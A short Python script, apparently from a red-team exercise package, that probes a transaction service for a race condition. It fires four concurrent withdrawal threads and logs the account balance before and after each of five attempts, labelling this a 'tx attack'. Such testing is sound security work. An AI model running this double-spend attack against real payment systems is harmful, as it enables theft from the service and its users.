import threading

from loguru import logger

from red.config import config
from red.utils import client


times = 5


def double_withdraw(user):
    def withdraw():
        client.process(
            user,
            action=client.Action.withdraw,
            amount='1',
        )
    threads = [
        threading.Thread(target=withdraw),
        threading.Thread(target=withdraw),
        threading.Thread(target=withdraw),
        threading.Thread(target=withdraw),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


def run():
    user = config.our_users[0]
    for tx in [
        double_withdraw,
    ]:
        logger.info(f"Trying tx attack {tx.__name__} {times} times...")
        for _ in range(times):
            logger.info(
                f"Attempt {_ + 1} starting with: "
                f"{user} has {client.get_balance(user)}"
            )
            tx(user)
            logger.info(
                f"Attempt {_ + 1} ended with: "
                f"{user} has {client.get_balance(user)}"
            )
